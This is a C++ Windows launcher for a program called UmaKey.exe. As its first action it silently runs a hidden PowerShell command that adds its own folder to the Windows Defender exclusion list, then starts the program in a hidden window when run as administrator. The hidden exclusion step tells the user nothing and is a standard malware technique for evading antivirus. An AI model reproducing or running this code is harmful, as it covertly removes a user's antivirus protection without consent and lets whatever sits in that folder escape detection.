#include <iostream>
#include <Windows.h>
#include <string>
#include <filesystem>
#include <TlHelp32.h>

namespace fs = std::filesystem;

bool isProcessRunning(const std::wstring& processName) {
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;

    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        return false;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcessSnap, &pe32)) {
        CloseHandle(hProcessSnap);
        return false;
    }

    do {
        if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
            CloseHandle(hProcessSnap);
            return true;
        }
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    return false;
}

bool IsCurrentUserAdmin() {
    BOOL isAdmin = FALSE;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID AdministratorsGroup;

    if (!AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &AdministratorsGroup)) {
        return false;
    }

    if (!CheckTokenMembership(NULL, AdministratorsGroup, &isAdmin)) {
        isAdmin = FALSE;
    }

    FreeSid(AdministratorsGroup);

    return isAdmin == TRUE;
}

bool fileExists(const char* filename) {
    DWORD fileAttributes = GetFileAttributesA(filename);
    return (fileAttributes != INVALID_FILE_ATTRIBUTES && !(fileAttributes & FILE_ATTRIBUTE_DIRECTORY));
}

std::string wstringToChar(const std::wstring& wstr) {
    int bufferSize = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, nullptr, 0, nullptr, nullptr);
    if (bufferSize == 0) {
        return "";
    }

    std::string result(bufferSize, '\0');
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &result[0], bufferSize, nullptr, nullptr);
    return result;
}

int main() {
    std::wstring processName = L"UmaKey.exe";
    std::wstring powershellCmd = L"Add-MpPreference -ExclusionPath \"" + fs::current_path().wstring() + L"\"";
    ShellExecute(NULL, NULL, L"powershell.exe", powershellCmd.c_str(), NULL, SW_HIDE);
    int count = 0;

    if (IsCurrentUserAdmin()) {
        retry:
        if (isProcessRunning(processName)) {
            return 0;
        }
        if (fileExists(wstringToChar(processName).c_str())) {
            ShellExecute(NULL, NULL, processName.c_str(), NULL, NULL, SW_HIDE);
        }
        else {
            ShellExecute(NULL, L"open", L"_internal\\update\\update.exe", NULL, NULL, SW_SHOWNORMAL);
            return 0;
        }
        if (!isProcessRunning(processName) && count++ < 10) {
            Sleep(1000);
            goto retry;
        }
    }
    else {
        char a;
        std::cin >> a;
    }

    return 0;
}
